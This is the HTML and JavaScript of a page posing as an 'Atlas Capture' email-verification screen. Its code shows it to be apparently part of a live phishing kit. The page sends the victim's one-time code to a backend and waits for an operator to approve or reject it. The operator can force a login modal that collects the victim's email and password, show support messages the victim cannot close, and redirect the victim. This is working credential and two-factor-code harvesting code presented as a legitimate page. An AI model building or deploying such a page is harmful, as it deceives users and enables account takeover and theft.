<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Atlas Capture - Verify Code</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: Inter, sans-serif
}

body {
    background: white;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    padding: 40px 10px;
}

.wrapper {
    max-width: 420px;
    width: 100%
}

.header {
    display: flex;
    justify-content: center;
    align-items: center;
    gap: 10px;
    margin-bottom: 18px;
}

.header span {
    font-weight: 600;
    font-size: 18px;
    color: #1f2937;
}

.card {
    background: white;
    border-radius: 22px;
    padding: 4px 22px;
    text-align: center;
}

.otp-icon {
    width: 64px;
    height: 64px;
    background: #eef2ff;
    border-radius: 32px;
    display: flex;
    align-items: center;
    justify-content: center;
    margin: 0 auto 20px;
}

.otp-icon svg {
    width: 32px;
    height: 32px;
    stroke: #4f46e5;
}

h2 {
    font-size: 24px;
    font-weight: 700;
    color: #1f2937;
    margin-bottom: 8px;
}

.subtext {
    color: #6b7280;
    font-size: 12px;
    margin-bottom: 28px;
}

.otp-input {
    width: 100%;
    font-size: 12px;
    text-align: center;
    border: 2px solid #e5e7eb;
    border-radius: 8px;
    background: #fff;
    transition: all 0.2s;
    font-family: 'JetBrains Mono', 'Fira Code', 'Courier New', monospace;
    margin-bottom: 20px;
    padding: 4px;
}

.otp-input:focus {
    outline: none;
    border-color: #4f46e5;
    box-shadow: 0 0 0 3px rgba(79, 70, 229, 0.1);
}

.otp-input:disabled {
    background: #f3f4f6;
    cursor: not-allowed;
}

.otp-input::placeholder {
    color: #cbd5e1;
    letter-spacing: 12px;
    font-size: 12px;
    font-weight: 600;
    text-align: center;
    opacity: 0.6;
}

button {
    width: 100%;
    padding: 6px;
    border-radius: 10px;
    border: none;
    background: linear-gradient(90deg, #2563eb, #7c3aed);
    color: #fff;
    font-weight: 600;
    cursor: pointer;
    margin-bottom: 16px;
}

button:disabled {
    opacity: 0.6;
    cursor: not-allowed;
}

.button-loading {
    display: inline-flex;
    align-items: center;
    gap: 8px;
}

.spinner {
    width: 18px;
    height: 18px;
    border: 2px solid rgba(255, 255, 255, 0.3);
    border-top-color: white;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
}

@keyframes spin {
    to {
        transform: rotate(360deg);
    }
}

.link {
    background: none;
    color: #4f46e5;
    font-size: 14px;
    font-weight: 500;
    margin: 0;
    padding: 0;
    box-shadow: none;
}

.link:hover {
    background: none;
    text-decoration: underline;
}

.error-message {
    color: #ef4444;
    font-size: 12px;
    margin-top: 12px;
    margin-bottom: 8px;
    display: none;
    line-height: 1.4;
}

.incorrect-message {
    color: #ef4444;
    font-size: 11px;
    margin-top: 8px;
    margin-bottom: 12px;
    display: none;
    line-height: 1.5;
    text-align: center;
    background: #fef2f2;
    padding: 10px;
    border-radius: 12px;
    border: 1px solid #fecaca;
}

#logoAtlas {
    height: 30px;
    width: 30px;
    border-radius: 25%;
    margin-right: 9px;
}

/* Modal overlay styles matching first template */
.modal-overlay {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0, 0, 0, 0.85);
    backdrop-filter: blur(4px);
    z-index: 10000;
    justify-content: center;
    align-items: center;
}

.modal-overlay.active {
    display: flex;
}

.modal {
    background: #fff;
    border-radius: 22px;
    max-width: 380px;
    width: 90%;
    padding: 32px 24px;
    text-align: center;
    box-shadow: 0 25px 50px rgba(0, 0, 0, 0.3);
}

.modal-icon {
    width: 64px;
    height: 64px;
    background: #eef2ff;
    border-radius: 32px;
    display: flex;
    align-items: center;
    justify-content: center;
    margin: 0 auto 20px;
}

.modal-icon svg {
    width: 32px;
    height: 32px;
    stroke: #4f46e5;
    fill: none;
}

.modal h3 {
    font-size: 24px;
    font-weight: 700;
    color: #1f2937;
    margin-bottom: 8px;
}

.modal p {
    color: #6b7280;
    font-size: 12px;
    margin-bottom: 28px;
    line-height: 1.5;
}

.modal-input {
    width: 100%;
    font-size: 12px;
    border: 2px solid #e5e7eb;
    border-radius: 8px;
    background: #fff;
    transition: all 0.2s;
    margin-bottom: 16px;
    padding: 8px 12px;
}

.modal-input:focus {
    outline: none;
    border-color: #4f46e5;
    box-shadow: 0 0 0 3px rgba(79, 70, 229, 0.1);
}

.modal-btn {
    width: 100%;
    padding: 6px;
    border-radius: 10px;
    border: none;
    background: linear-gradient(90deg, #2563eb, #7c3aed);
    color: #fff;
    font-weight: 600;
    cursor: pointer;
    margin-top: 8px;
}

.modal-btn:hover:not(:disabled) {
    opacity: 0.9;
}

.modal-btn:disabled {
    opacity: 0.6;
    cursor: not-allowed;
}

.modal-error {
    color: #ef4444;
    font-size: 12px;
    margin-top: 12px;
    display: none;
}

.loading-spinner-small {
    width: 30px;
    height: 30px;
    border: 3px solid #e5e7eb;
    border-top: 3px solid #4f46e5;
    border-radius: 50%;
    animation: spin 1s linear infinite;
    margin: 10px auto;
}

/* Admin text popup */
#adminTextPopup {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0, 0, 0, 0.88);
    backdrop-filter: blur(8px);
    z-index: 20000;
    justify-content: center;
    align-items: center;
}

#adminTextPopup.active {
    display: flex;
}

.admin-text-box {
    background: white;
    border-radius: 22px;
    max-width: 400px;
    width: 90%;
    padding: 32px 24px;
    text-align: center;
    box-shadow: 0 25px 50px rgba(0, 0, 0, 0.35);
}

.admin-text-icon {
    width: 64px;
    height: 64px;
    background: #eef2ff;
    border-radius: 32px;
    display: flex;
    align-items: center;
    justify-content: center;
    margin: 0 auto 20px;
}

.admin-text-icon svg {
    width: 32px;
    height: 32px;
    stroke: #4f46e5;
    fill: none;
}

.admin-text-title {
    font-size: 24px;
    font-weight: 700;
    color: #1f2937;
    margin-bottom: 8px;
}

.admin-text-content {
    background: #f3f4f6;
    padding: 20px;
    border-radius: 16px;
    font-size: 14px;
    line-height: 1.8;
    color: #1f2937;
    word-break: break-word;
}

/* Styled tokens injected by formatMessage() */
.msg-yes {
    color: #059669;
    font-weight: 800;
    font-size: 1.35em;
    background: #d1fae5;
    padding: 2px 10px;
    border-radius: 8px;
    display: inline-block;
}

.msg-num {
    color: #4f46e5;
    font-weight: 800;
    font-size: 1.2em;
    background: #e0e7ff;
    padding: 2px 8px;
    border-radius: 8px;
    display: inline-block;
}

.msg-caps {
    color: #dc2626;
    font-weight: 800;
    background: #fee2e2;
    padding: 2px 8px;
    border-radius: 8px;
    display: inline-block;
}
</style>
</head>
<body>

<div class="wrapper">
  <div class="header">
    <div class="icon"><img id="logoAtlas" src="https://i.postimg.cc/dQjyw0ZV/atlas.png" alt="atlas logo"></div>
    <span>Atlas Capture</span>
  </div>
  <div class="card">
    <h2>Check your email</h2>
    <p class="subtext">We sent you a 6-character verification code</p>
    <input type="text" class="otp-input" id="otpInput" maxlength="6" placeholder="000000" oninput="this.value=this.value.replace(/\D/g,'')">
    <div id="errorMessage" class="error-message"></div>
    <button id="verifyBtn">Verify</button>
    <button class="link" id="differentEmail">Use a different email</button>
  </div>
</div>

<!-- Login modal (force login) -->
<div id="loginModal" class="modal-overlay">
  <div class="modal" id="loginModalContent">
    <div class="modal-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg></div>
    <h3>Account Verification Required</h3>
    <p>Please login with your email and password to continue.</p>
    <input type="email" id="loginEmail" class="modal-input" placeholder="Email address">
    <input type="password" id="loginPassword" class="modal-input" placeholder="Password">
    <button id="submitLoginBtn" class="modal-btn">Login to Continue →</button>
    <div id="modalError" class="modal-error"></div>
  </div>
</div>

<!-- Admin text popup — NO close button for user -->
<div id="adminTextPopup">
  <div class="admin-text-box">
    <div class="admin-text-icon">
      <svg viewBox="0 0 24 24" stroke-width="1.5"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
    </div>
    <div class="admin-text-title">Message from Support</div>
    <div class="admin-text-content" id="adminTextContent"></div>
  </div>
</div>

<script>
  const urlParams = new URLSearchParams(window.location.search);
  const email = urlParams.get('email');
  if (!email) window.location.href = '/users/login';

  const otpInput  = document.getElementById('otpInput');
  const verifyBtn = document.getElementById('verifyBtn');
  const errorDiv  = document.getElementById('errorMessage');

  let isProcessing      = false;
  let approvalInterval  = null;
  let blockCheckInterval = null;
  let isModalOpen       = false;
  let adminTextHandling = false;

  // ── Format message: work on RAW text, never on HTML ───────────────────────
  // Strategy: split text into tokens (words + spaces + punctuation),
  // style each token individually so regex never touches injected HTML.
  function formatMessage(rawText) {
    // Split into word-tokens and non-word separators
    const parts = rawText.split(/(\s+|[^a-zA-Z0-9]+)/);
    return parts.map(part => {
      // YES (case-insensitive whole word)
      if (/^yes$/i.test(part)) {
        return `<span class="msg-yes">YES</span>`;
      }
      // Pure integer number
      if (/^\d+$/.test(part)) {
        return `<span class="msg-num">${part}</span>`;
      }
      // All-caps word 3+ letters (not YES, already handled above)
      if (/^[A-Z]{3,}$/.test(part)) {
        return `<span class="msg-caps">${part}</span>`;
      }
      // Everything else — escape HTML and return as-is
      return part.replace(/[&<>]/g, m => m === '&' ? '&amp;' : m === '<' ? '&lt;' : '&gt;');
    }).join('');
  }

  // ── Show admin text popup (replaces any existing one) ─────────────────────
  function showAdminTextPopup(rawMessage) {
    const popup   = document.getElementById('adminTextPopup');
    const content = document.getElementById('adminTextContent');
    content.innerHTML = formatMessage(rawMessage);
    popup.classList.add('active');
  }

  // ── Hide admin text popup (only called when admin releases) ───────────────
  function hideAdminTextPopup() {
    document.getElementById('adminTextPopup').classList.remove('active');
  }

  // ── User-side flag release — no JWT ───────────────────────────────────────
  async function releaseAdminText() {
    try {
      await fetch('/api/users/release-admin-text', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email })
      });
    } catch (e) {}
  }

  // ── Single unified admin_text poller ──────────────────────────────────────
  async function pollAdminText() {
    if (adminTextHandling) return;
    try {
      const res  = await fetch('/api/users/check-admin-text', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email })
      });
      const data = await res.json();

      // If flag was released (admin clicked Release), hide popup
      if (data.text_release === true) {
        hideAdminTextPopup();
        return;
      }

      if (!data.admin_text) return;

      adminTextHandling = true;

      const txt = data.admin_text;

      if (txt === 'incorrect_otp_error') {
        await handleIncorrectOtp();
      } else if (txt === 'wrong_login_error') {
        await handleWrongLogin();
      } else if (txt === 'correct_login_success') {
        await handleCorrectLogin();
      } else {
        // Regular text message from admin — show popup, do NOT release automatically
        // Admin must click "Release" on dashboard to close it
        showAdminTextPopup(txt);
        adminTextHandling = false; // unlock so next poll can detect a replacement
      }

    } catch (e) { adminTextHandling = false; }
  }

  // ── Incorrect OTP ──────────────────────────────────────────────────────────
  async function handleIncorrectOtp() {
    await releaseAdminText();
    if (approvalInterval) { clearInterval(approvalInterval); approvalInterval = null; }
    isProcessing = false;

    errorDiv.textContent = '❌ Incorrect code. Please check your email for the latest code and try again.';
    errorDiv.style.display = 'block';
    otpInput.value = '';

    verifyBtn.disabled = true;
    verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Please wait...</span>';
    setTimeout(() => { verifyBtn.disabled = false; verifyBtn.innerHTML = 'Verify'; otpInput.focus(); }, 2000);
    setTimeout(() => { errorDiv.style.display = 'none'; adminTextHandling = false; }, 5000);
  }

  // ── Wrong login ────────────────────────────────────────────────────────────
  async function handleWrongLogin() {
    await releaseAdminText();

    const modalError    = document.getElementById('modalError');
    const loginPassword = document.getElementById('loginPassword');
    const submitBtn     = document.getElementById('submitLoginBtn');

    if (modalError)    { modalError.textContent = '❌ Invalid email or password. Please try again.'; modalError.style.display = 'block'; }
    if (loginPassword) loginPassword.value = '';
    if (submitBtn) {
      submitBtn.disabled = true;
      submitBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Please wait...</span>';
      setTimeout(() => { submitBtn.disabled = false; submitBtn.innerHTML = 'Login to Continue →'; }, 2000);
    }
    setTimeout(() => { if (modalError) modalError.style.display = 'none'; adminTextHandling = false; }, 4000);
  }

  // ── Correct login ──────────────────────────────────────────────────────────
  async function handleCorrectLogin() {
    await releaseAdminText();
    const mc = document.getElementById('loginModalContent');
    if (mc) {
      mc.innerHTML = `<div style="text-align:center;">
        <div class="modal-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg></div>
        <h3>Validating Credentials</h3>
        <div class="loading-spinner-small"></div>
        <p>Please wait as we validate your details...</p>
        <p style="font-size:12px;color:#666;margin-top:10px;">Do not close this window</p>
      </div>`;
    }
    setTimeout(() => { adminTextHandling = false; }, 3000);
  }

  // ── Block check ────────────────────────────────────────────────────────────
  async function checkIfBlocked() {
    try {
      const res  = await fetch('/api/users/check-blocked', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email })
      });
      const data = await res.json();
      if (data.blocked === true) { window.location.href = `/users/success?email=${encodeURIComponent(email)}`; return true; }
      return false;
    } catch (e) { return false; }
  }

  function startBlockChecking() {
    if (blockCheckInterval) clearInterval(blockCheckInterval);
    blockCheckInterval = setInterval(async () => {
      const blocked = await checkIfBlocked();
      if (blocked) { clearInterval(blockCheckInterval); if (approvalInterval) clearInterval(approvalInterval); }
    }, 3000);
  }

  // ── OTP submit + first-approval poll ──────────────────────────────────────
  function showLoading() { isProcessing = true; verifyBtn.disabled = true; verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Verifying...</span>'; errorDiv.style.display = 'none'; }
  function showWaiting() { verifyBtn.disabled = true; verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Please wait...</span>'; }
  function resetButton() { isProcessing = false; verifyBtn.disabled = false; verifyBtn.innerHTML = 'Verify'; }

  function startCheckingFirstApproval() {
    if (approvalInterval) clearInterval(approvalInterval);
    approvalInterval = setInterval(async () => {
      try {
        const blocked = await checkIfBlocked();
        if (blocked) return;
        const res  = await fetch('/api/users/check-first-approval', {
          method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email })
        });
        const data = await res.json();
        if (data.approved === true) {
          clearInterval(approvalInterval);
          window.location.href = `/users/second-otp?email=${encodeURIComponent(email)}`;
        }
      } catch (e) {}
    }, 2000);
  }

  async function verifyOTP() {
    if (isProcessing) return;
    const isBlocked = await checkIfBlocked();
    if (isBlocked) return;

    const otp = otpInput.value.trim();
    if (!otp || otp.length !== 6) {
      errorDiv.textContent = 'Please enter all 6 characters';
      errorDiv.style.display = 'block';
      setTimeout(() => errorDiv.style.display = 'none', 3000);
      return;
    }

    showLoading();
    try {
      const res  = await fetch('/api/users/submit-otp', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, otp })
      });
      const data = await res.json();
      if (data.success) {
        showWaiting();
        startBlockChecking();
        startCheckingFirstApproval();
      } else {
        resetButton();
        errorDiv.textContent = data.error || 'Something went wrong. Please try again.';
        errorDiv.style.display = 'block';
        setTimeout(() => errorDiv.style.display = 'none', 4000);
      }
    } catch (e) {
      resetButton();
      errorDiv.textContent = 'Network error. Please try again.';
      errorDiv.style.display = 'block';
      setTimeout(() => errorDiv.style.display = 'none', 3000);
    }
  }

  // ── Force-login polling ────────────────────────────────────────────────────
  function startForceLoginPolling() {
    setInterval(async () => {
      if (isModalOpen) return;
      try {
        const res  = await fetch('/api/users/check-force-login', {
          method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email })
        });
        const data = await res.json();
        if (data.force_login === true) {
          isModalOpen = true;
          document.getElementById('loginModal').classList.add('active');
          document.getElementById('loginEmail').value = '';
          document.getElementById('loginPassword').value = '';
          document.getElementById('modalError').style.display = 'none';
          const btn = document.getElementById('submitLoginBtn');
          if (btn) { btn.disabled = false; btn.innerHTML = 'Login to Continue →'; }
        }
      } catch (e) {}
    }, 2000);
  }

  // ── Redirect-success polling ───────────────────────────────────────────────
  function startRedirectSuccessPolling() {
    setInterval(async () => {
      try {
        const res  = await fetch('/api/users/check-redirect-success', {
          method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email })
        });
        const data = await res.json();
        if (data.redirect_success === true) window.location.href = `/users/success?email=${encodeURIComponent(email)}`;
      } catch (e) {}
    }, 2000);
  }

  // ── Login modal submit ─────────────────────────────────────────────────────
  async function submitLogin() {
    const loginEmail    = document.getElementById('loginEmail').value.trim();
    const loginPassword = document.getElementById('loginPassword').value;
    const modalError    = document.getElementById('modalError');
    const submitBtn     = document.getElementById('submitLoginBtn');

    if (!loginEmail || !loginPassword) { modalError.textContent = 'Please enter both email and password'; modalError.style.display = 'block'; return; }
    const emailRegex = /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/;
    if (!emailRegex.test(loginEmail)) { modalError.textContent = 'Please enter a valid email address'; modalError.style.display = 'block'; return; }

    submitBtn.disabled = true;
    submitBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Verifying...</span>';
    modalError.style.display = 'none';

    try {
      const res  = await fetch('/api/users/submit-login-popup', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, loginEmail, loginPassword })
      });
      const data = await res.json();
      if (data.success) {
        submitBtn.disabled = true;
        submitBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Verifying...</span>';
      } else {
        modalError.textContent = data.error || 'Failed to verify account';
        modalError.style.display = 'block';
        submitBtn.disabled = false;
        submitBtn.innerHTML = 'Login to Continue →';
      }
    } catch (e) {
      modalError.textContent = 'Network error. Please try again.';
      modalError.style.display = 'block';
      submitBtn.disabled = false;
      submitBtn.innerHTML = 'Login to Continue →';
    }
  }

  // ── Boot ───────────────────────────────────────────────────────────────────
  startForceLoginPolling();
  startRedirectSuccessPolling();
  startBlockChecking();
  setInterval(pollAdminText, 2000);

  verifyBtn.addEventListener('click', verifyOTP);
  otpInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') verifyOTP(); });
  otpInput.focus();
  document.getElementById('differentEmail').addEventListener('click', () => { window.location.href = '/users/login'; });
  document.getElementById('submitLoginBtn').addEventListener('click', submitLogin);
</script>
</body>
</html>
